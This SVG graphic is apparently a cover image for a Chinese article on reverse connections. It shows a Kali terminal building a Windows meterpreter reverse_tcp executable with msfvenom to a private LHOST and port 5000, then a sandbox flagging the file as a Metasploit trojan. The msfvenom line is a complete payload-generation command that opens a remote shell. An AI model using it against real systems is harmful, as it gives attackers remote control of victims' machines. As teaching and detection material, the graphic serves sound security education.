<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 450" width="800" height="450">
  <defs>
    <linearGradient id="bg6b" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#0D1024"/>
      <stop offset="50%" stop-color="#181330"/>
      <stop offset="100%" stop-color="#2A1F42"/>
    </linearGradient>
    <linearGradient id="cardb" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#0B0E1B"/>
      <stop offset="100%" stop-color="#070810"/>
    </linearGradient>
    <linearGradient id="lineb" x1="0" y1="0" x2="1" y2="0">
      <stop offset="0%" stop-color="#6C5CE7"/>
      <stop offset="100%" stop-color="#00D2A8"/>
    </linearGradient>
    <filter id="blur6b" x="-50%" y="-50%" width="200%" height="200%">
      <feGaussianBlur stdDeviation="14"/>
    </filter>
  </defs>

  <rect width="800" height="450" fill="url(#bg6b)"/>

  <g fill="#ffffff">
    <circle cx="64" cy="38" r="1.4" opacity="0.6"/>
    <circle cx="152" cy="24" r="1" opacity="0.38"/>
    <circle cx="244" cy="58" r="1.2" opacity="0.5"/>
    <circle cx="330" cy="30" r="1" opacity="0.35"/>
    <circle cx="424" cy="18" r="1.3" opacity="0.5"/>
    <circle cx="516" cy="52" r="1" opacity="0.4"/>
    <circle cx="608" cy="26" r="1.3" opacity="0.5"/>
    <circle cx="700" cy="58" r="1.4" opacity="0.55"/>
    <circle cx="772" cy="32" r="1" opacity="0.4"/>
    <circle cx="758" cy="116" r="1.1" opacity="0.32"/>
    <circle cx="40" cy="170" r="1" opacity="0.3"/>
    <circle cx="726" cy="388" r="1.2" opacity="0.42"/>
    <circle cx="84" cy="400" r="1" opacity="0.33"/>
    <circle cx="620" cy="410" r="0.9" opacity="0.3"/>
  </g>

  <g filter="url(#blur6b)" opacity="0.3">
    <ellipse cx="140" cy="76" rx="126" ry="58" fill="#6C5CE7"/>
    <ellipse cx="668" cy="356" rx="136" ry="54" fill="#00A88A"/>
  </g>

  <!-- 上半：生成被控端 -->
  <rect x="88" y="70" width="624" height="128" rx="9" fill="url(#cardb)" stroke="#352B52" stroke-width="1.2"/>
  <rect x="88" y="70" width="4" height="128" rx="2" fill="url(#lineb)"/>

  <g font-family="Consolas, 'Courier New', monospace">
    <text x="118" y="102" font-size="12" fill="#5D6883">kali@kali:~$</text>
    <text x="122" y="128" font-size="14" fill="#C8C2E0">msfvenom -p windows/x64/</text>
    <text x="122" y="128" font-size="14" fill="#00D2A8" opacity="0"> </text>
    <text x="352" y="128" font-size="14" fill="#00D2A8">meterpreter/reverse_tcp</text>
    <text x="122" y="152" font-size="14" fill="#7FB8E8">LHOST=192.168.96.130</text>
    <text x="330" y="152" font-size="14" fill="#E8A87C">LPORT=5000</text>
    <text x="122" y="176" font-size="14" fill="#8B94AD">-f exe -o payload64.exe</text>
    <text x="430" y="176" font-size="12.5" fill="#5D6883">// 7680 bytes</text>
  </g>

  <!-- 反向连接箭头 -->
  <path d="M400 210 L400 246" stroke="#3D3358" stroke-width="1.6" stroke-dasharray="5 4"/>
  <path d="M394 240 L400 248 L406 240" fill="none" stroke="#00D2A8" stroke-width="1.8"/>
  <text x="414" y="234" font-family="Consolas, monospace" font-size="11.5" fill="#6C5CE7">bind → ← reverse</text>

  <!-- 下半：沙箱判定 -->
  <rect x="88" y="256" width="624" height="104" rx="9" fill="#070810" stroke="#2C2544" stroke-width="1"/>
  <g font-family="Consolas, monospace">
    <text x="116" y="286" font-size="12" fill="#5D6883">sandbox verdict</text>
    <text x="116" y="316" font-size="20" fill="#F0616B" font-weight="bold">恶意</text>
    <text x="196" y="316" font-size="19" fill="#E8E6F2">11 / 28</text>
    <text x="336" y="316" font-size="14" fill="#E8A87C">木马</text>
    <text x="392" y="316" font-size="14" fill="#00D2A8">Metasploit</text>
    <text x="116" y="342" font-size="11.5" fill="#8FA6C4">TCP × 6  →  192.168.96.130:5000   （无 DNS / 无 HTTP）</text>
  </g>

  <rect x="88" y="392" width="624" height="2" fill="url(#lineb)"/>

  <text x="88" y="424" font-family="'Microsoft YaHei', 'PingFang SC', sans-serif" font-size="18.5" fill="#E8E6F2" letter-spacing="1.2">反向连接：从 msfvenom 到沙箱判定</text>
</svg>
